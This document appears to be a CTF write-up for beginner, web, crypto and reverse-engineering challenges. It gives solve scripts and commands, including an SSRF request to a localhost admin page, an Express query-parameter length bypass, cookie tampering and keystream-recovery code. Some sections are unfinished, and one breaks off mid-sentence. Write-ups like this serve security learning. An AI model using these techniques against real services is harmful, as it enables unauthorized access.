# Beginner Challenges

## 1985

Use `uudecode email.txt` to extract the binary `FLGPRNTR.COM` - run in `dosbox` to get flag

## Augury

XOR cipher with known keystream

```python3
from pwn import *
from PIL import Image
import re

r = remote("augury.challs.pwnoh.io", 1337, ssl=True)
r.sendline("2")
r.sendline("secret_pic.png")

enc_image = r.recvall(timeout = 3)
enc_image = bytes.fromhex( re.findall(b"[0-9a-f]{10,}", enc_image)[0].decode() )

# Image must have PNG header...
png_header = bytes.fromhex("89504E47")
# So we know the first 4 bytes of the keystream
keystream_first_4_bytes = xor( png_header, enc_image[:4] )
# and therefore the first value of the LCG
x = int.from_bytes(keystream_first_4_bytes, byteorder='big')

# Now, generate the rest of the bytes...
keystream_bytes = keystream_first_4_bytes
while len(keystream_bytes) <= len(enc_image):
        x = (x * 3404970675 + 3553295105) % (2 ** 32)
        keystream_bytes += x.to_bytes(4, byteorder='big')

im_out = xor(enc_image , keystream_bytes)[:len(enc_image)]
with open("out.png", "wb") as f:
        f.write(im_out)
```

## The Professor's Files

Beginner forensics:

```sh
/content/doc# cp ../report.docx .
/content/doc# unzip report.docx 
Archive:  report.docx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: docProps/app.xml        
  inflating: docProps/core.xml       
  inflating: docProps/custom.xml     
  inflating: word/_rels/document.xml.rels  
  inflating: word/document.xml       
  inflating: word/fontTable.xml      
  inflating: word/settings.xml       
  inflating: word/styles.xml         
  inflating: word/theme/theme1.xml   
/content/doc# grep -R "ctf"
word/theme/theme1.xml:      <!-- bctf{docx_is_zip} -->
```

## Cosmonaut (Not Solved)
File given is `cosmonaut.com` which is a program compiled with https://github.com/jart/cosmopolitan
There are multiple flag fragments...

Simply running the file gets us the first fragment:
```sh
/content# ./cosmonaut.com 
Cosmonauts run their programs everywhere and all at once.
Like on Linux!
bctf{4_7ru3_
```

Binwalk yields more files but using `strings`, these are all loaders:
```
# find . | xargs -I{} file {}
.: directory
./5B01C: directory
./5B01C/decompressed.bin: C source, Unicode text, UTF-8 text
./59CDC: directory
./59CDC/decompressed.bin: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (FreeBSD), static-pie linked, not stripped
./58C88: directory
./58C88/decompressed.bin: ELF 64-bit LSB executable, x86-64, version 1 (FreeBSD), for OpenBSD, statically linked, no section header
```

Running the program with `wine` yields another fragment:
```sh
$ wine ./cosmonaut.com 
MESA-INTEL: warning: Haswell Vulkan support is incomplete
Cosmonauts run their programs everywhere and all at once.
Like on Windows!
c05m0p0l174n_c0nn353ur_
```

For OpenBSD, I will use an [online emulator](https://copy.sh/v86/?profile=openbsd) - this was quite a pain as this emulator does not support copy/paste and many of these systems do not have basic utilities like `xxd`, `python`, etc:
Basically, I
 - uploaded a hexdump of the COM file as a CD-Rom and use `strings` to get the hex value
 - use 

## Mind Boggle
BF program - run in online interpreter; then random base conversion:
```bash
$ echo 596D4E305A6E7430636A467762444E664E30677A583277306557565363313955636A467762444E66644768465830567559334A35554851784D453539 | xxd -r -p  | base64 -d
```

## ebg13
Initially tried to access `/admin` from the `/ebg13` endpoint but this doesn't work - putting in the original URL into the form returns a copy of the website: this is a classic SSRF

```sh
$ curl --silent https://ebg13.challs.pwnoh.io/ebj13?url=http://localhost:3000/admin | rot13
<ugzy><urnq></urnq><obql>Hello self! The flag is bctf{what_happens_if_i_use_this_website_on_itself}.</obql></ugzy>
```

## Ramesses
Cookie manipulation - the cookie value is base64 encoded JSON so simply change and get flag

# Web

## BIG CHUNGUS
Query parameters in ExpressJS allow `req.query.username.length > 0xB16_C4A6A5`:

```sh
$ curl --silent 'https://big-chungus.challs.pwnoh.io/?username\[length\]=100000000000000000'  | grep -oE "bctf{.*}"
bctf{b16_chun6u5_w45_n3v3r_7h15_b16}
```

## Awklet (Not Solved)

Various things attempted - some kind of parameter injection...

# Crypto

## cube cipher

```python
# View scramble of cube as a permutation \pi \in S_54
# We need to wittle down **which** permutation this is

from pwn import remote
from tqdm import tqdm
import re

MAX_ITER = 54

r = remote("cube-cipher.challs.pwnoh.io", 1337 , ssl = True)
r.recvuntil("Option:")

permutation = [set(range(54)) for _ in range(54)]

scrambles = []
print("[+] Collecting scrambles...")
for _ in tqdm( range(MAX_ITER) ):
    r.sendline('3')
    scrambles.append(re.findall(b"[0-9a-f]+", r.recvline() ) [0])
    r.sendline('4')
    r.recvline()

# Hope this is enough to determine the permutation:
for init, new in zip(scrambles, scrambles[1:]):
    for char in b"0123456789abcdef":
        old_idxs = [i for i in range(54) if init[i] == char]
        new_idxs = [i for i in range(54) if new[i] == char]
        for old_idx in old_idxs:
            for not_possible_new_idx in [j for j in range(54) if j not in new_idxs]:
                permutation[old_idx].discard(not_possible_new_idx)

assert all([len(i) == 1 for i in permutation])
permutation = [next(iter(i)) for i in permutation]

# Check this is the valid permutation
for init, new in zip(scrambles, scrambles[1:]):
    for i in range(54):
        assert new[ permutation[i] ] == init[ i ]

# Print flag
print( bytes.fromhex("".join( [ chr(scrambles[0][permutation[i]])  for i in range(54) ] )) )
```

# Rev

## Square Cipher
Z3 plug and chug:
```py
Y = [ int(bin(y).translate(str.maketrans('1b','fx')),0) for y in [
    511,
    261632,
    1838599,
    14708792,
    117670336,
    133955584,
    68585259008,
    35115652612096,
    246772580483072,
    1974180643864576,
    15793445150916608,
    17979214137393152,
    9205357638345293824,
    4713143110832790437888,
    4731607904558235517441,
    9463215809116471034882,
    18926431618232942069764,
    33121255085135066300416,
    37852863236465884139528,
    75705726472931768279056,
    151411452945863536558112,
    264970040681080530403328,
    302822905891727073116224,
    605645811783454146232448,
    1211291623566908292464896,
    2119760325448644243226624,
    2413129272746388704198656,
]]

import z3
from math import ceil, log2

BV_LENGTH = max([i.bit_length() for i in Y])

x = z3.BitVec('x', BV_LENGTH)
solver = z3.Solver()

#https://stackoverflow.com/a/61331081
def HW(bvec):
    return z3.Sum([ z3.ZeroExt(int(ceil(log2(bvec.size()))), z3.Extract(i,i,bvec)) for i in range(bvec.size())])


for y in Y:
    solver.add( HW( x & y ) == 15 )
solver.add( x & 2135465562637171390290201561322170738230609084732268110734985633502584038857972308065155558608880 == 1271371190459412480076309932821732439054921890752535035282222258816851982409101952239053178406432)

if solver.check() == z3.sat:
    print(hex( solver.model()[x].as_long() )[2:])
```